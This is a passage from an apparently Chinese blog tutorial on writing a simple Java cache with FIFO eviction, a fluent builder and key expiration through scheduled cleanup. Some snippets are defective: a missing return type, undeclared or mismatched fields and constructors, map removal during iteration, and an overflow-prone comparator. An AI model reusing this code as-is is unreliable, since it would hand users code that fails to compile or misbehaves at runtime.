<p>因为缓存的大小有限，所以不能无限制的像cache（也就是Map集合）中添加元素 ，当到达容量上限时，需要从cache中淘汰元素，所以需要添加驱逐策略。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICacheEvict</span>&lt;K, V&gt; &#123;
        <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 驱除策略</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> context 上下文</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@since</span> 0.0.2</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 被移除的明细，没有时返回 null</span>
<span class="hljs-comment">     */</span>
   evict(<span class="hljs-keyword">final</span> ICacheEvictContext&lt;K, V&gt; context);
&#125;</code></pre>

<p>其中<code>ICacheEvictContext</code>,包含了缓存对象，缓存大小限制，以及需要添加到缓存中的key</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 缓存驱逐上下文</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> &lt;K&gt;</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> &lt;V&gt;</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICacheEvictContext</span>&lt;K, V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 待缓存的key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    K <span class="hljs-title function_">key</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 缓存对象</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    ICache&lt;K, V &gt; cache();

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 缓存大小</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span>;
&#125;
</code></pre>

<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="CacheEvictContext"><a href="#CacheEvictContext" class="headerlink" title="CacheEvictContext"></a>CacheEvictContext</h3><p>该类的实现比较简单，实现对单个成员变量的初始化，并返回该对象本身，便于实现fluent流式编程</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheEvictContext</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheEvictContext</span>&lt;K, V&gt; &#123;


    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 新加的 key</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> K key;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * cache 实现</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> ICache&lt;K,V&gt; cache;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 最大的大小</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> size;


    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> K <span class="hljs-title function_">key</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> key;
    &#125;

    <span class="hljs-keyword">public</span> CacheEvictContext&lt;K, V&gt; <span class="hljs-title function_">key</span><span class="hljs-params">(K key)</span> &#123;
        <span class="hljs-built_in">this</span>.key = key;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ICache&lt;K, V&gt; <span class="hljs-title function_">cache</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> cache;
    &#125;

    <span class="hljs-keyword">public</span> CacheEvictContext&lt;K, V&gt; <span class="hljs-title function_">cache</span><span class="hljs-params">(ICache&lt;K, V&gt; cache)</span> &#123;
        <span class="hljs-built_in">this</span>.cache = cache;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> size;
    &#125;

    <span class="hljs-keyword">public</span> CacheEvictContext&lt;K, V&gt; <span class="hljs-title function_">size</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span> &#123;
        <span class="hljs-built_in">this</span>.size = size;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;
&#125;</code></pre>



<p>淘汰策略实现<code>cacheEvict.evict(context);</code>如下</p>
<h3 id="CacheEvictFIFO"><a href="#CacheEvictFIFO" class="headerlink" title="CacheEvictFIFO"></a>CacheEvictFIFO</h3><p>淘汰策略可以有多种，比如 LRU&#x2F;LFU&#x2F;FIFO 等等，我们此处实现一个最基本的 FIFO。</p>
<p>拥有FIFO特性的数据结构就是queue的，那么就用java中<code>LinkedList</code>集合实现该方法。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheEvictFIFO</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheEvict</span>&lt;K,V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * queue按添加顺序保存key信息</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> Queue&lt;K&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">evict</span><span class="hljs-params">(ICacheEvictContext&lt;K, V&gt; context)</span> &#123;
        <span class="hljs-keyword">final</span> ICache&lt;K,V&gt; cache = context.cache();
        <span class="hljs-comment">// 超过限制，执行移除</span>
        <span class="hljs-keyword">if</span>(cache.size() &gt;= context.size()) &#123;
            <span class="hljs-type">K</span> <span class="hljs-variable">evictKey</span> <span class="hljs-operator">=</span> queue.remove();
            <span class="hljs-comment">// 移除最开始的元素</span>
            cache.remove(evictKey);
        &#125;

        <span class="hljs-comment">// 将新加的元素放入队尾</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> context.key();
        queue.add(key);
    &#125;
&#125;</code></pre>

<h3 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h3><p>核心的cache类，向其中添加一些关键属性</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cache</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICache</span>&lt;K,V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * map信息</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> Map&lt;K,V&gt; map;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 缓存大小限制</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> sizeLimit;


    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 驱除策略</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> ICacheEvict&lt;K,V&gt; evict;
  
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Cache</span><span class="hljs-params">(Map&lt;K, V&gt; map, <span class="hljs-type">int</span> sizeLimit, ICacheEvict&lt;K, V&gt; evict)</span> &#123;
        <span class="hljs-built_in">this</span>.map = map;
        <span class="hljs-built_in">this</span>.sizeLimit = sizeLimit;
        <span class="hljs-built_in">this</span>.evict = evict;
    &#125;
    
    <span class="hljs-comment">// Override Map method</span>
&#125;</code></pre>

<p>一些方法的重写没有在此贴出，使用快捷键补全后，调用map参数对应的方法即可。</p>
<p>对于put方法的改动比较大</p>
<ul>
<li>驱逐旧元素</li>
<li>添加新元素</li>
</ul>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;
    <span class="hljs-comment">//1.1 尝试驱除</span>
    CacheEvictContext&lt;K,V&gt; context = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheEvictContext</span>&lt;&gt;();
    context.key(key).size(sizeLimit).cache(<span class="hljs-built_in">this</span>);
    cacheEvict.evict(context);
    <span class="hljs-comment">//2. 判断驱除后的信息</span>
    <span class="hljs-keyword">if</span>(isSizeLimit()) &#123;
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheRuntimeException</span>(<span class="hljs-string">&quot;当前队列已满，数据添加失败！&quot;</span>);
    &#125;
    <span class="hljs-comment">//3. 执行添加</span>
    <span class="hljs-keyword">return</span> map.put(key, value);
&#125;

<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSizeLimit</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">currentSize</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.size();
    <span class="hljs-keyword">return</span> currentSize &gt;= <span class="hljs-built_in">this</span>.sizeLimit;
&#125;
</code></pre>

<p>可以让用户动态指定大小，但是指定大小肯就要有对应的淘汰策略。否则，固定大小的 map 肯定无法放入元素。</p>
<h3 id="CacheBs"><a href="#CacheBs" class="headerlink" title="CacheBs"></a>CacheBs</h3><p>为了方便用户创建客户端，可以创建一个引导类，这里使用到了fluent流式写法。</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 缓存引导类</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheBs</span>&lt;K,V&gt; &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">CacheBs</span><span class="hljs-params">()</span>&#123;&#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 创建对象实例</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> &lt;K&gt; key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> &lt;V&gt; value</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> this</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;K,V&gt; CacheBs&lt;K,V&gt; <span class="hljs-title function_">newInstance</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheBs</span>&lt;&gt;();
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * map 实现</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> Map&lt;K,V&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 大小限制</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> Integer.MAX_VALUE;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 驱除策略</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> ICacheEvict&lt;K,V&gt; evict = CacheEvicts.fifo();

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * map 实现</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> map map</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> this</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> CacheBs&lt;K, V&gt; <span class="hljs-title function_">map</span><span class="hljs-params">(Map&lt;K, V&gt; map)</span> &#123;
        ArgUtil.notNull(map, <span class="hljs-string">&quot;map&quot;</span>);

        <span class="hljs-built_in">this</span>.map = map;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 设置 size 信息</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> size size</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> this</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> CacheBs&lt;K, V&gt; <span class="hljs-title function_">size</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span> &#123;
        ArgUtil.notNegative(size, <span class="hljs-string">&quot;size&quot;</span>);

        <span class="hljs-built_in">this</span>.size = size;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 设置驱除策略</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> evict 驱除策略</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> this</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> CacheBs&lt;K, V&gt; <span class="hljs-title function_">evict</span><span class="hljs-params">(ICacheEvict&lt;K, V&gt; evict)</span> &#123;
        <span class="hljs-built_in">this</span>.evict = evict;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 构建缓存信息</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 缓存信息</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> ICache&lt;K,V&gt; <span class="hljs-title function_">build</span><span class="hljs-params">()</span> &#123;
        CacheContext&lt;K,V&gt; context = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheContext</span>&lt;&gt;();
        context.cacheEvict(evict);
        context.map(map);
        context.size(size);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>&lt;&gt;(context);
    &#125;

&#125;</code></pre>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><pre><code class="hljs java">ICache&lt;String, String&gt; cache = CacheBs.&lt;String,String&gt;newInstance()
        .size(<span class="hljs-number">2</span>)
        .build();
cache.put(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);
cache.put(<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);
cache.put(<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>);
cache.put(<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>);
System.out.println(cache.keySet());</code></pre>

<p>默认为先进先出的策略，此时输出 keys，内容如下：</p>
<pre><code class="hljs angelscript"><span class="hljs-string">[3, 4]</span></code></pre>



<h1 id="实现key过期"><a href="#实现key过期" class="headerlink" title="实现key过期"></a>实现key过期</h1><p>redis中可以设置key的过期时间，这是一个非常有用的功能，比如将短信的验证码设置5分钟的过期时间；登录凭证设置一天有效等，这些场景都需要使用。</p>
<h2 id="相关接口-1"><a href="#相关接口-1" class="headerlink" title="相关接口"></a>相关接口</h2><h3 id="ICache"><a href="#ICache" class="headerlink" title="ICache"></a>ICache</h3><p>首先在ICache中添加两个方法</p>
<ul>
<li><p><code>expire()</code>多久后过期</p>
</li>
<li><p><code>expireAt()</code>在什么时间过期</p>
</li>
</ul>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICache</span>&lt;K, V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Map</span>&lt;K, V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 设置过期时间</span>
<span class="hljs-comment">     * （1）如果 key 不存在，则什么都不做。</span>
<span class="hljs-comment">     * （2）暂时不提供新建 key 指定过期时间的方式，会破坏原来的方法。</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * 会做什么：</span>
<span class="hljs-comment">     * 类似于 redis</span>
<span class="hljs-comment">     * （1）惰性删除。</span>
<span class="hljs-comment">     * 在执行下面的方法时，如果过期则进行删除。</span>
<span class="hljs-comment">     * &#123;<span class="hljs-doctag">@link</span> ICache#get(Object)&#125; 获取</span>
<span class="hljs-comment">     * &#123;<span class="hljs-doctag">@link</span> ICache#values()&#125; 获取所有值</span>
<span class="hljs-comment">     * &#123;<span class="hljs-doctag">@link</span> ICache#entrySet()&#125; 获取所有明细</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * 【数据的不一致性】</span>
<span class="hljs-comment">     * 调用其他方法，可能得到的不是使用者的预期结果，因为此时的 expire 信息可能没有被及时更新。</span>
<span class="hljs-comment">     * 比如</span>
<span class="hljs-comment">     * &#123;<span class="hljs-doctag">@link</span> ICache#isEmpty()&#125; 是否为空</span>
<span class="hljs-comment">     * &#123;<span class="hljs-doctag">@link</span> ICache#size()&#125; 当前大小</span>
<span class="hljs-comment">     * 同时会导致以 size() 作为过期条件的问题。</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * 解决方案：考虑添加 refresh 等方法，暂时不做一致性的考虑。</span>
<span class="hljs-comment">     * 对于实际的使用，我们更关心 K/V 的信息。</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * （2）定时删除</span>
<span class="hljs-comment">     * 启动一个定时任务。每次随机选择指定大小的 key 进行是否过期判断。</span>
<span class="hljs-comment">     * 类似于 redis，为了简化，可以考虑设定超时时间，频率与超时时间成反比。</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * 其他拓展性考虑：</span>
<span class="hljs-comment">     * 后期考虑提供原子性操作，保证事务性。暂时不做考虑。</span>
<span class="hljs-comment">     * 此处默认使用 TTL 作为比较的基准，暂时不想支持 LastAccessTime 的淘汰策略。会增加复杂度。</span>
<span class="hljs-comment">     * 如果增加 lastAccessTime 过期，本方法可以不做修改。</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> key         key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> timeInMills 毫秒时间之后过期</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> this</span>
<span class="hljs-comment">     */</span>
    ICache&lt;K, V&gt; <span class="hljs-title function_">expire</span><span class="hljs-params">(<span class="hljs-keyword">final</span> K key, <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> timeInMills)</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 在指定的时间过期</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> key key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> timeInMills 时间戳</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> this</span>
<span class="hljs-comment">    ICache&lt;K, V&gt; expireAt(final K key, final long timeInMills);</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">&#125;</span></code></pre>

<h3 id="ICacheExpire"><a href="#ICacheExpire" class="headerlink" title="ICacheExpire"></a>ICacheExpire</h3><p>定义缓存过期的处理结构</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICacheExpire</span>&lt;K,V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 指定过期信息</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> key key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> expireAt 什么时候过期</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">expire</span><span class="hljs-params">(<span class="hljs-keyword">final</span> K key, <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> expireAt)</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 惰性删除中需要处理的 keys</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> keyList keys</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">refreshExpire</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Collection&lt;K&gt; keyList)</span>;
&#125;</code></pre>



<h2 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="CacheExpire"><a href="#CacheExpire" class="headerlink" title="CacheExpire"></a>CacheExpire</h3><p>实现定期删除过期key的思路，开一个线程定时执行，从cache种删除过期的key</p>
<ul>
<li>需要创建一个集合保存key于expiretime之间的关系</li>
<li>创建一个线程用于清除过期的key</li>
</ul>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;K, Long&gt; expireMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">expire</span><span class="hljs-params">(K key, <span class="hljs-type">long</span> expireAt)</span> &#123;
    expireMap.put(key, expireAt);
&#125;</code></pre>

<p>为了防止每次清理的时间占用过长时间，这里限制每次最多清理100</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 单次清空的数量限制</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">LIMIT</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 缓存实现</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ICache&lt;K,V&gt; cache;
<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 线程执行类</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">EXECUTOR_SERVICE</span> <span class="hljs-operator">=</span> Executors.newSingleThreadScheduledExecutor();
<span class="hljs-keyword">public</span> <span class="hljs-title function_">CacheExpire</span><span class="hljs-params">(ICache&lt;K, V&gt; cache)</span> &#123;
    <span class="hljs-built_in">this</span>.cache = cache;
    <span class="hljs-built_in">this</span>.init();
&#125;
<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 初始化任务</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;
    EXECUTOR_SERVICE.scheduleAtFixedRate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ExpireThread</span>(), <span class="hljs-number">100</span>, <span class="hljs-number">100</span>, TimeUnit.MILLISECONDS);
&#125;</code></pre>

<p>创建清理过期key的线程类ExpireThread</p>
<p>此类作为CacheExpire的内部了</p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExpireThread</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-comment">//1.判断是否为空</span>
        <span class="hljs-keyword">if</span>(MapUtil.isEmpty(expireMap)) &#123;
            <span class="hljs-keyword">return</span>;
        &#125;
        <span class="hljs-comment">//2. 获取 key 进行处理</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span>(Map.Entry&lt;K, Long&gt; entry : expireMap.entrySet()) &#123;
            <span class="hljs-keyword">if</span>(count &gt;= LIMIT) &#123;
                <span class="hljs-keyword">return</span>;
            &#125;
            expireKey(entry);
            count++;
        &#125;
    &#125;
&#125;</code></pre>

<p>执行清除的函数</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 执行过期操作</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> entry 明细</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">expireKey</span><span class="hljs-params">(Map.Entry&lt;K, Long&gt; entry)</span> &#123;
    <span class="hljs-keyword">final</span> <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> entry.getKey();
    <span class="hljs-keyword">final</span> <span class="hljs-type">Long</span> <span class="hljs-variable">expireAt</span> <span class="hljs-operator">=</span> entry.getValue();
    <span class="hljs-comment">// 删除的逻辑处理</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">currentTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
    <span class="hljs-keyword">if</span>(currentTime &gt;= expireAt) &#123;
        expireMap.remove(key);
        <span class="hljs-comment">// 再移除缓存，后续可以通过惰性删除做补偿</span>
        cache.remove(key);
    &#125;
&#125;</code></pre>

<h4 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h4><ul>
<li>当<code>CacheExpire</code>被创建时，会启动定时清除的子线程</li>
<li>当调用cache.expire()和cache.expireAt()方法时，会将key与expiretime保存到expireMap</li>
<li>子线程不断执行，检查expireMap是否为空<ul>
<li>为空，则结束本次执行</li>
<li>不为空，检查清除操作</li>
</ul>
</li>
</ul>
<h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>如果过期的应用场景不多，那么经常轮训的意义实际不大。</p>
<p>比如我们的任务 99% 都是在凌晨清空数据，白天无论怎么轮询，纯粹是浪费资源。</p>
<p>那有没有什么方法，可以快速的判断有没有需要处理的过期元素呢？</p>
<p>答案是有的，那就是排序的 MAP。</p>
<p>我们换一种思路，让过期的时间做 key，相同时间的需要过期的信息放在一个列表中，作为 value。</p>
<p>然后对过期时间排序，轮询的时候就可以快速判断出是否有过期的信息了。</p>
<h3 id="CacheExpireSort"><a href="#CacheExpireSort" class="headerlink" title="CacheExpireSort"></a>CacheExpireSort</h3><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheExpireSort</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheExpire</span>&lt;K,V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 单次清空的数量限制</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">LIMIT</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 排序缓存存储</span>
<span class="hljs-comment">     * 使用按照时间排序的缓存处理。</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;Long, List&lt;K&gt;&gt; sortMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;Long&gt;() &#123;
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Long o1, Long o2)</span> &#123;
            <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>) (o1-o2);
        &#125;
    &#125;);

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 过期 map</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * 空间换时间</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;K, Long&gt; expireMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 缓存实现</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ICache&lt;K,V&gt; cache;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 线程执行类</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">EXECUTOR_SERVICE</span> <span class="hljs-operator">=</span> Executors.newSingleThreadScheduledExecutor();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CacheExpireSort</span><span class="hljs-params">(ICache&lt;K, V&gt; cache)</span> &#123;
        <span class="hljs-built_in">this</span>.cache = cache;
        <span class="hljs-built_in">this</span>.init();
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 初始化任务</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;
        EXECUTOR_SERVICE.scheduleAtFixedRate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ExpireThread</span>(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, TimeUnit.SECONDS);
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 定时执行任务</span>
<span class="hljs-comment">     */</span>
